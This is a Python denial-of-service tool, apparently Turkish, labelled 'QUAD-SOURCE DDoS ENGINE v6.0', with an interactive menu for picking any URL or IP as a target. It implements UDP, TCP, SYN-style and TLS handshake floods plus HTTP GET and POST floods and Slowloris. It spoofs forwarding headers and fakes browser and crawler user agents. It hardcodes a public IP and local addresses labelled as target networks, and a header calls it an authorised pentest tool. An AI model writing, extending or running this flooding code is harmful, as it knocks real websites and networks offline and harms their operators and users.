#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# QUAD-SOURCE DDoS ENGINE v6.0 - 4 KAYNAK AĞ
# ============================================================================
# Yetkili pentest için - 4 farklı WiFi ağından eş zamanlı saldırı
# ============================================================================
# KAYNAK AĞLAR:
# 1) Kendi WiFi ağınız (bulunduğunuz ağ)
# 2) 78.181.164.55 (hedef ağ)
# 3) 192.168.1.140 (hedef ağ)
# 4) 192.168.1.138 (hedef ağ)
# 5) 192.168.1.1 (yeni eklendi - gateway/router)
# ============================================================================

import socket
import threading
import random
import time
import sys
import os
import ssl
import urllib.request
import urllib.error
import hashlib
import http.client
import multiprocessing
import subprocess
import ipaddress
import netifaces
from datetime import datetime
from urllib.parse import urlparse

# ==================== KONFİGÜRASYON ====================

# KAYNAK AĞLAR (bu ağların üzerinden saldırı yapılacak)
SOURCE_NETWORKS = [
    {"ip": "192.168.1.1", "name": "Router/Gateway", "interface": None},
    {"ip": "78.181.164.55", "name": "Hedef Ağ-1", "interface": None},
    {"ip": "192.168.1.140", "name": "Hedef Ağ-2", "interface": None},
    {"ip": "192.168.1.138", "name": "Hedef Ağ-3", "interface": None}
]

# Kendi ağını otomatik tespit et
OWN_INTERFACE = None
OWN_IP = None

# HEDEF
TARGET = None
TARGET_PORT = 80
TARGET_IS_IP = False

# PERFORMANS AYARLARI
THREADS_PER_NETWORK = 800   # Her ağ için thread sayısı
MAX_PROCESSES = 4           # Process sayısı
SOCKET_TIMEOUT = 3

# İSTATİSTİK
stats = {
    "total_packets": 0,
    "total_bytes": 0,
    "total_errors": 0,
    "network_stats": {}
}
stats_lock = threading.Lock()
running = True
start_time = 0

def get_own_network():
    """Kendi ağ bilgilerini al"""
    global OWN_INTERFACE, OWN_IP
    
    try:
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            if iface == 'lo':
                continue
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    ip = addr['addr']
                    if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
                        OWN_INTERFACE = iface
                        OWN_IP = ip
                        return iface, ip
    except:
        pass
    
    # Fallback
    try:
        result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'default' in line:
                parts = line.split()
                if len(parts) >= 5:
                    OWN_INTERFACE = parts[4]
        if OWN_INTERFACE:
            result = subprocess.run(['ip', 'addr', 'show', OWN_INTERFACE], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    OWN_IP = line.strip().split()[1].split('/')[0]
    except:
        pass
    
    return OWN_INTERFACE, OWN_IP

def bind_to_interface(interface_name):
    """Socket'i belirli bir ağ arayüzüne bağla"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface_name.encode())
        return sock
    except:
        return None

def create_interface_socket(interface_name, sock_type=socket.SOCK_DGRAM):
    """Belirli bir arayüz için socket oluştur"""
    try:
        sock = socket.socket(socket.AF_INET, sock_type)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface_name.encode())
        return sock
    except:
        # SO_BINDTODEVICE yoksa normal socket döndür
        sock = socket.socket(socket.AF_INET, sock_type)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return sock

def update_network_stats(source_ip, packets=1, bytes_count=0, errors=0):
    """Ağ bazlı istatistik güncelle"""
    global stats
    with stats_lock:
        stats["total_packets"] += packets
        stats["total_bytes"] += bytes_count
        stats["total_errors"] += errors
        
        if source_ip not in stats["network_stats"]:
            stats["network_stats"][source_ip] = {"packets": 0, "bytes": 0, "errors": 0}
        stats["network_stats"][source_ip]["packets"] += packets
        stats["network_stats"][source_ip]["bytes"] += bytes_count
        stats["network_stats"][source_ip]["errors"] += errors

# ==================== LAYER 4 - GERÇEK PAKET GÖNDERİMİ ====================

def udp_flood_from_interface(target_ip, target_port, source_ip, interface):
    """Belirli bir ağ arayüzünden UDP Flood"""
    try:
        sock = create_interface_socket(interface, socket.SOCK_DGRAM)
        sock.settimeout(1)
        
        # Maksimum boyutta paket
        data_size = random.randint(1400, 65507)
        data = random._urandom(data_size)
        
        # Rastgele hedef port
        dst_port = target_port if target_port else random.randint(1, 65535)
        
        sock.sendto(data, (target_ip, dst_port))
        sock.close()
        
        update_network_stats(source_ip, 1, 28 + data_size)
        return True
    except Exception as e:
        update_network_stats(source_ip, 0, 0, 1)
        return False

def udp_burst_from_interface(target_ip, target_port, source_ip, interface):
    """Burst UDP - aynı anda çoklu paket"""
    try:
        sock = create_interface_socket(interface, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        
        for _ in range(100):  # 100 paket birden
            try:
                data = random._urandom(random.randint(1000, 1500))
                dst_port = target_port if target_port else random.randint(1, 65535)
                sock.sendto(data, (target_ip, dst_port))
                update_network_stats(source_ip, 1, 1500)
            except:
                break
        
        sock.close()
        return True
    except:
        update_network_stats(source_ip, 0, 0, 1)
        return False

def tcp_connect_from_interface(target_ip, target_port, source_ip, interface):
    """TCP Connect Flood - belirli ağdan"""
    try:
        sock = create_interface_socket(interface, socket.SOCK_STREAM)
        sock.settimeout(2)
        
        sock.connect((target_ip, target_port))
        
        try:
            sock.send(random._urandom(512))
        except:
            pass
        
        time.sleep(0.01)
        sock.close()
        
        update_network_stats(source_ip, 1, 1000)
        return True
    except:
        update_network_stats(source_ip, 0, 0, 1)
        return False

def tcp_syn_from_interface(target_ip, target_port, source_ip, interface):
    """TCP SYN (non-blocking connect) - belirli ağdan"""
    try:
        sock = create_interface_socket(interface, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.setblocking(0)
        
        try:
            sock.connect((target_ip, target_port))
        except BlockingIOError:
            pass
        
        time.sleep(0.001)
        sock.close()
        
        update_network_stats(source_ip, 1, 100)
        return True
    except:
        update_network_stats(source_ip, 0, 0, 1)
        return False

def ssl_connect_from_interface(target_ip, target_port, source_ip, interface):
    """SSL/TLS Handshake Flood - belirli ağdan"""
    try:
        sock = create_interface_socket(interface, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target_ip, target_port))
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        try:
            ssl_sock = ctx.wrap_socket(sock, server_hostname=target_ip)
            ssl_sock.close()
        except:
            sock.close()
        
        update_network_stats(source_ip, 1, 5000)
        return True
    except:
        update_network_stats(source_ip, 0, 0, 1)
        return False

# ==================== LAYER 7 - GERÇEK HTTP/HTTPS ====================

def http_flood_from_interface(target_url, source_ip, interface):
    """HTTP Flood - belirli bir ağ arayüzünden"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        
        # Rastgele path
        paths = [
            f"/?{random.randint(100000,999999)}={int(time.time()*1000)}",
            f"/?nocache={hashlib.md5(str(random.random()).encode()).hexdigest()[:12]}",
            f"/?v={random.randint(1,999)}.{random.randint(1,999)}",
            f"/api/v{random.randint(1,5)}/{random.randint(100,999)}",
            f"/assets/style.css?v={random.randint(1,99999)}",
            f"/?page={random.randint(1,100)}&perpage={random.randint(10,100)}",
            f"/{''.join(random.choices('abcdefgh', k=random.randint(3,8)))}.php?id={random.randint(1,9999)}",
            f"/index.php?option=com_{''.join(random.choices('abcdefgh', k=6))}&view={random.randint(1,100)}"
        ]
        
        attack_path = random.choice(paths)
        full_url = target_url.rstrip('/') + attack_path
        
        # Socket üzerinden manuel HTTP isteği (interface binding ile)
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        
        sock = create_interface_socket(interface, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        # Gerçekçi HTTP isteği
        user_agent = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/121.0.6167.164 Mobile Safari/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
        ])
        
        request = (
            f"GET {attack_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Connection: keep-alive\r\n"
            f"Cache-Control: no-cache\r\n"
            f"Pragma: no-cache\r\n"
            f"X-Forwarded-For: {source_ip}\r\n"
            f"X-Real-IP: {source_ip}\r\n"
            f"Client-IP: {source_ip}\r\n"
            f"Referer: https://www.google.com/search?q={random.choice(['test','security','bypass'])}\r\n"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Site: none\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"DNT: 1\r\n"
            f"\r\n"
        )
        
        sock.send(request.encode())
        
        try:
            response = sock.recv(4096)
            update_network_stats(source_ip, 1, len(request) + len(response))
        except:
            update_network_stats(source_ip, 1, len(request))
        
        sock.close()
        return True
    except:
        update_network_stats(source_ip, 0, 0, 1)
        return False

def http_post_from_interface(target_url, source_ip, interface):
    """HTTP POST - büyük veri, belirli ağdan"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        path = parsed.path or '/'
        
        # Büyük POST verisi
        post_size = random.randint(32768, 262144)  # 32KB - 256KB
        post_data = random._urandom(post_size)
        
        boundary = f"----WebKitFormBoundary{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}"
        
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"file\"; filename=\"data_{random.randint(1000,9999)}.bin\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + post_data + f"\r\n--{boundary}--\r\n".encode()
        
        sock = create_interface_socket(interface, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT * 2)
        sock.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n"
            f"X-Forwarded-For: {source_ip}\r\n"
            f"Expect: \r\n"
            f"\r\n"
        ).encode() + body
        
        sock.send(request)
        
        try:
            response = sock.recv(4096)
            update_network_stats(source_ip, 1, len(request) + len(response))
        except:
            update_network_stats(source_ip, 1, len(request))
        
        sock.close()
        return True
    except:
        update_network_stats(source_ip, 0, 0, 1)
        return False

def slowloris_from_interface(target_url, source_ip, interface):
    """Slowloris - belirli ağ bağlantısı üzerinden"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        path = parsed.path or '/'
        
        sock = create_interface_socket(interface, socket.SOCK_STREAM)
        sock.settimeout(60)
        sock.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        # Kısmi HTTP isteği
        request = (
            f"GET {path}?{random.randint(0,999999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: */*\r\n"
            f"X-Forwarded-For: {source_ip}\r\n"
            f"Connection: keep-alive\r\n"
        )
        
        sock.send(request.encode())
        
        # Yavaş yavaş header ekle (bağlantıyı canlı tut)
        for _ in range(random.randint(50, 300)):
            try:
                time.sleep(random.uniform(1, 5))
                sock.send(f"X-Random-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
                update_network_stats(source_ip, 1, 100)
            except:
                break
        
        sock.close()
        update_network_stats(source_ip, 1, 5000)
        return True
    except:
        update_network_stats(source_ip, 0, 0, 1)
        return False

# ==================== AĞ BAŞINA WORKER ====================

def network_worker(target, port, attack_mode, target_url, source_network):
    """Her bir ağ için worker process"""
    global running
    
    source_ip = source_network["ip"]
    interface = source_network["interface"]
    name = source_network["name"]
    
    # Eğer interface yoksa, kendi ağını kullan
    if not interface:
        interface = OWN_INTERFACE
    
    # Ağ bilgisini göster
    if interface:
        print(f"\033[1;32m  [✓] {name} ({source_ip}) → Interface: {interface}\033[0m")
    else:
        print(f"\033[1;33m  [!] {name} ({source_ip}) → Interface yok, kendi ağ kullanılacak\033[0m")
    
    # Thread havuzu
    threads = []
    tpw = THREADS_PER_NETWORK  # threads per worker
    
    def l4_udp():
        while running:
            if interface:
                udp_flood_from_interface(target, port, source_ip, interface)
            else:
                # Interface yoksa normal socket
                udp_flood_from_interface(target, port, source_ip, "lo")
    
    def l4_udp_burst():
        while running:
            if interface:
                udp_burst_from_interface(target, port, source_ip, interface)
            else:
                udp_burst_from_interface(target, port, source_ip, "lo")
    
    def l4_tcp():
        while running:
            if interface:
                tcp_connect_from_interface(target, port, source_ip, interface)
            else:
                tcp_connect_from_interface(target, port, source_ip, "lo")
    
    def l4_syn():
        while running:
            if interface:
                tcp_syn_from_interface(target, port, source_ip, interface)
            else:
                tcp_syn_from_interface(target, port, source_ip, "lo")
    
    def l4_ssl():
        while running:
            if interface:
                ssl_connect_from_interface(target, port, source_ip, interface)
            else:
                ssl_connect_from_interface(target, port, source_ip, "lo")
    
    def l7_http():
        while running and target_url:
            if interface:
                http_flood_from_interface(target_url, source_ip, interface)
            else:
                http_flood_from_interface(target_url, source_ip, "lo")
    
    def l7_post():
        while running and target_url:
            if interface:
                http_post_from_interface(target_url, source_ip, interface)
            else:
                http_post_from_interface(target_url, source_ip, "lo")
    
    def l7_slow():
        while running and target_url:
            if interface:
                slowloris_from_interface(target_url, source_ip, interface)
            else:
                slowloris_from_interface(target_url, source_ip, "lo")
    
    # Thread'leri oluştur
    if attack_mode in ["udp", "all4", "all"]:
        for _ in range(tpw // 6):
            t = threading.Thread(target=l4_udp)
            t.daemon = True; threads.append(t); t.start()
            t = threading.Thread(target=l4_udp_burst)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["syn", "all4", "all"]:
        for _ in range(tpw // 6):
            t = threading.Thread(target=l4_syn)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["tcp", "all4", "all"]:
        for _ in range(tpw // 6):
            t = threading.Thread(target=l4_tcp)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["ssl", "all4", "all"]:
        for _ in range(tpw // 6):
            t = threading.Thread(target=l4_ssl)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["get", "all7", "all"]:
        for _ in range(tpw // 6):
            t = threading.Thread(target=l7_http)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["post", "all7", "all"]:
        for _ in range(tpw // 6):
            t = threading.Thread(target=l7_post)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["slow", "all7", "all"]:
        for _ in range(tpw // 6):
            t = threading.Thread(target=l7_slow)
            t.daemon = True; threads.append(t); t.start()
    
    print(f"\033[1;36m  [{name}] {len(threads)} thread aktif ({source_ip})\033[0m")
    
    while running:
        time.sleep(1)

# ==================== İSTATİSTİK ====================

def stats_monitor():
    """Gerçek zamanlı istatistik"""
    global running, stats, start_time
    
    while running:
        time.sleep(0.5)
        
        with stats_lock:
            pkts = stats["total_packets"]
            bytes_s = stats["total_bytes"]
            errs = stats["total_errors"]
            net_stats = dict(stats["network_stats"])
        
        elapsed = time.time() - start_time
        if elapsed > 1:
            mbps = (bytes_s * 8) / elapsed / 1_000_000
            pps = pkts / elapsed
            mb_total = bytes_s / 1_000_000
        else:
            mbps = 0
            pps = 0
            mb_total = 0
        
        # Ağ bazında hız
        sys.stdout.write('\033[2K\r')
        sys.stdout.write(
            f"\n\033[1;36m[{datetime.now().strftime('%H:%M:%S')}] "
            f"\033[1;31m📊 {mbps:.1f} Mbps \033[1;32m📦 {pkts:,} pkt \033[1;34m⚡ {pps:,.0f} pps \033[1;35m💾 {mb_total:.1f} MB \033[1;33m⏱ {elapsed:.0f}s ❌ {errs:,}\033[0m\n"
        )
        
        # Her ağın katkısı
        for src_ip, nstats in sorted(net_stats.items()):
            if nstats["bytes"] > 0 and elapsed > 0:
                n_mbps = (nstats["bytes"] * 8) / elapsed / 1_000_000
                n_pkts = nstats["packets"]
                bar = "█" * int(n_mbps / 5) + "░" * max(0, 20 - int(n_mbps / 5))
                sys.stdout.write(f"\033[1;36m  {src_ip:15s} \033[1;33m{bar}\033[0m \033[1;32m{n_mbps:.1f} Mbps\033[0m \033[1;37m({n_pkts:,} pkt)\033[0m\n")
        
        sys.stdout.write("\033[0m")
        sys.stdout.flush()

# ==================== ANA MOTOR ====================

def find_network_interfaces():
    """Tüm ağ arayüzlerini tespit et ve kaynak ağlarla eşleştir"""
    global SOURCE_NETWORKS
    
    # Kendi ağını bul
    own_iface, own_ip = get_own_network()
    
    print(f"\n\033[1;36m[ℹ] Kendi Ağ: {own_ip} → Interface: {own_iface}\033[0m")
    
    # Tüm arayüzleri tara
    try:
        interfaces = netifaces.interfaces()
        iface_networks = {}
        
        for iface in interfaces:
            if iface == 'lo':
                continue
            try:
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip = addr['addr']
                        mask = addr.get('netmask', '255.255.255.0')
                        if not ip.startswith('127.'):
                            iface_networks[ip] = iface
            except:
                pass
        
        # Kaynak ağları arayüzlerle eşleştir
        for net in SOURCE_NETWORKS:
            src_ip = net["ip"]
            if src_ip in iface_networks:
                net["interface"] = iface_networks[src_ip]
            elif own_iface:
                net["interface"] = own_iface
    
    except Exception as e:
        print(f"\033[1;33m[!] Ağ tespiti: {e}\033[0m")
        # Fallback: kendi interface'ini kullan
        for net in SOURCE_NETWORKS:
            net["interface"] = own_iface

def launch_attack(target, port, attack_mode, target_is_ip=False):
    global running, start_time, stats
    
    running = True
    start_time = time.time()
    
    with stats_lock:
        stats["total_packets"] = 0
        stats["total_bytes"] = 0
        stats["total_errors"] = 0
        stats["network_stats"] = {}
    
    # URL hazırlığı
    target_url = None
    if not target_is_ip:
        target_url = target
        if not target_url.startswith('http'):
            target_url = f"https://{target_url}"
    
    # Ağ arayüzlerini bul
    find_network_interfaces()
    
    print(f"\n\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;31m🔥 5 KAYNAK AĞ İLE DDoS SALDIRISI BAŞLATILDI 🔥\033[0m")
    print(f"\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;36m🎯 Hedef: \033[1;33m{target}\033[0m")
    print(f"\033[1;36m🔌 Port: \033[1;33m{port}\033[0m")
    print(f"\033[1;36m🌐 Kaynak Ağlar:\033[0m")
    print(f"\033[1;33m    1) {OWN_IP} (SENIN WIFI)\033[0m")
    print(f"\033[1;33m    2) 192.168.1.1 (ROUTER/GATEWAY)\033[0m")
    print(f"\033[1;33m    3) 78.181.164.55 (HEDEF AĞ-1)\033[0m")
    print(f"\033[1;33m    4) 192.168.1.140 (HEDEF AĞ-2)\033[0m")
    print(f"\033[1;33m    5) 192.168.1.138 (HEDEF AĞ-3)\033[0m")
    print(f"\033[1;36m⚙️  Mod: \033[1;33m{attack_mode.upper()}\033[0m")
    print(f"\033[1;36m🧵 Thread/Ağ: \033[1;33m{THREADS_PER_NETWORK:,}\033[0m")
    print(f"\033[1;36m🖥️  Process: \033[1;33m{MAX_PROCESSES}\033[0m")
    print(f"\033[1;36m🔓 Root: \033[1;32mGEREKMEZ\033[0m")
    print(f"\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;37m[!] Ctrl+C ile durdur\033[0m")
    print(f"\033[1;37m[!] HER AĞ AYRI AYNI SALDIRI YAPIYOR\033[0m\n")
    
    # İstatistik thread'i
    t = threading.Thread(target=stats_monitor)
    t.daemon = True
    t.start()
    
    # Her ağ için worker başlat
    processes = []
    
    for net in SOURCE_NETWORKS:
        # Her ağ için 2 process
        for p in range(2):
            proc = multiprocessing.Process(
                target=network_worker,
                args=(target, port, attack_mode, target_url, net)
            )
            proc.daemon = True
            processes.append(proc)
            proc.start()
            time.sleep(0.1)
    
    # Kendi IP'miz için de worker
    own_net = {"ip": OWN_IP or "192.168.1.100", "name": "Senin WiFi", "interface": OWN_INTERFACE}
    for p in range(2):
        proc = multiprocessing.Process(
            target=network_worker,
            args=(target, port, attack_mode, target_url, own_net)
        )
        proc.daemon = True
        processes.append(proc)
        proc.start()
        time.sleep(0.1)
    
    total = len(processes)
    total_threads = total * (THREADS_PER_NETWORK // 2)
    
    print(f"\n\033[1;32m[✅] {total} process başlatıldı ({len(SOURCE_NETWORKS)+1} ağ)")
    print(f"[✅] ~{total_threads:,} thread aktif")
    print(f"[✅] Tüm ağlardan EŞ ZAMANLI saldırı\033[0m\n")
    
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        elapsed = time.time() - start_time
        
        for proc in processes:
            proc.terminate()
            proc.join(timeout=1)
        
        with stats_lock:
            f_pkts = stats["total_packets"]
            f_bytes = stats["total_bytes"]
            f_errs = stats["total_errors"]
        
        mbps = (f_bytes * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
        
        print(f"\n\n\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;31m⛔ SALDIRI DURDURULDU\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;33m📊 Toplam: {f_pkts:,} paket, {f_bytes/1_000_000:.1f} MB\033[0m")
        print(f"\033[1;33m📊 Süre: {elapsed:.0f}s, Hız: {mbps:.1f} Mbps, {f_pkts/elapsed:,.0f} pps\033[0m")
        print(f"\033[1;33m📊 Hatalar: {f_errs:,}\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")

# ==================== MENU ====================

def main():
    global THREADS_PER_NETWORK, MAX_PROCESSES
    
    os.system('clear')
    print("""\033[1;36m
    ╔══════════════════════════════════════════════════╗
    ║      QUAD-SOURCE DDoS ENGINE v6.0              ║
    ║      5 KAYNAK AĞ İLE DDoS                      ║
    ║                                                ║
    ║      ✓ Senin WiFi                              ║
    ║      ✓ 192.168.1.1 (Gateway)                   ║
    ║      ✓ 78.181.164.55                           ║
    ║      ✓ 192.168.1.140                           ║
    ║      ✓ 192.168.1.138                           ║
    ║                                                ║
    ║      Layer 4 + Layer 7 | ROOT GEREKMEZ         ║
    ║      Gerçek ağ bağlantıları | Gerçek paketler   ║
    ╚══════════════════════════════════════════════════╝
    \033[0m""")
    
    print("\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║        SALDIRI MODU SEÇİN            ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m L4 → UDP Flood (MAX PAKET)       ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m L4 → TCP Connect Flood          ║\033[0m")
    print("\033[1;36m║  \033[1;33m[3]\033[1;36m L4 → TCP SYN Flood              ║\033[0m")
    print("\033[1;36m║  \033[1;33m[4]\033[1;36m L4 → SSL/TLS Handshake Flood    ║\033[0m")
    print("\033[1;36m║  \033[1;33m[5]\033[1;36m L4 → TÜMÜ (UDP+TCP+SYN+SSL)     ║\033[0m")
    print("\033[1;36m║  \033[1;33m[6]\033[1;36m L7 → HTTP GET Flood             ║\033[0m")
    print("\033[1;36m║  \033[1;33m[7]\033[1;36m L7 → HTTP POST (256KB)          ║\033[0m")
    print("\033[1;36m║  \033[1;33m[8]\033[1;36m L7 → Slowloris                  ║\033[0m")
    print("\033[1;36m║  \033[1;33m[9]\033[1;36m L7 → TÜMÜ (GET+POST+Slow)       ║\033[0m")
    print("\033[1;36m║  \033[1;31m[10]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)          ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    choice = input("\n\033[1;33m[?] Seçim (1-10): \033[0m").strip()
    
    modes = {
        "1": "udp", "2": "tcp", "3": "syn", "4": "ssl",
        "5": "all4", "6": "get", "7": "post", "8": "slow",
        "9": "all7", "10": "all"
    }
    
    if choice not in modes:
        print("\033[1;31m[!] Geçersiz seçim!\033[0m")
        return
    
    attack_mode = modes[choice]
    
    print("\n\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║           HEDEF SEÇİN                 ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m URL (site.com)                  ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m IP Adresi                       ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    tc = input("\n\033[1;33m[?] Seçim (1-2): \033[0m").strip()
    
    target = None
    port = 80
    is_ip = False
    
    if tc == "1":
        target = input("\033[1;33m[?] Hedef URL (site.com): \033[0m").strip()
        if not target.startswith('http'):
            target = f"https://{target}"
        is_ip = False
        port_str = input(f"\033[1;33m[?] Port (varsayılan: 443): \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 443
    elif tc == "2":
        target = input("\033[1;33m[?] Hedef IP: \033[0m").strip()
        is_ip = True
        port_str = input("\033[1;33m[?] Port (örn: 80, 443): \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 80
    else:
        print("\033[1;31m[!] Geçersiz!\033[0m")
        return
    
    # Performans ayarları
    tc = input(f"\033[1;33m[?] Thread/Ağ (varsayılan: {THREADS_PER_NETWORK}, max 5000): \033[0m").strip()
    if tc:
        try:
            THREADS_PER_NETWORK = max(100, min(5000, int(tc)))
        except:
            pass
    
    pc = input(f"\033[1;33m[?] Process sayısı (varsayılan: {MAX_PROCESSES}, CPU kadar): \033[0m").strip()
    if pc:
        try:
            MAX_PROCESSES = max(1, min(8, int(pc)))
        except:
            pass
    
    launch_attack(target, port, attack_mode, is_ip)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
